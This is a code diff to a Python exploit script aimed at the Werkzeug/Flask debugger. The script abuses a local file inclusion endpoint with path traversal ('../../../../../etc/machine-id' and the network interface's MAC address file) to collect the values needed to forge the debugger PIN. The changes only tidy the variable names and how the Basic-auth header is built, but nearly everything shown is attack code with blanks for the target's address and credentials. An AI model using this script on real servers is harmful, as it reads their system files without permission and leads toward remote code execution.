@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 
 import requests
-from base64 import b64encode
 import hashlib
+from base64 import b64encode
 from itertools import chain
 
 USER = ''   # Username to authenticate to Werkzeug
 PASSWD = '' # Password to authenticate to Werkzeug
-creds = b64encode("{0}:{1}".format(USER, PASSWD).encode('UTF-8')).decode('ascii')
+WERK_USER = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
 
 IFACE = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
 RHOST = ''  # IP address or hostname of the remote system hosting Werkzeug
@@ -18,11 +18,11 @@ mac_path = '../../../../../sys/class/net/{0}/address'.format(IFACE) # Path to Ma
 id_path = '../../../../../etc/machine-id'   # Path to Machine-ID
 url = 'http://{0}:{1}/{2}?filename='.format(RHOST, RPORT, LFI_PAGE_DIR)
 
-werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
-
 payload = {}
 headers = {
-    'Authorization': 'Basic {0}'.format(creds)
+    'Authorization': 'Basic {0}'.format(b64encode("{0}:{1}".format(
+        USER, 
+        PASSWD).encode('UTF-8')).decode('ascii'))
 }
 
 get_node = str(int(requests.request(
@@ -43,7 +43,7 @@ get_machine_id = requests.request(
 #                         getattr(mod, '__file__', None)
 #                         ]
 probably_public_bits = [
-    werk_user,
+    WERK_USER,
     'flask.app',
     'Flask',
     '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
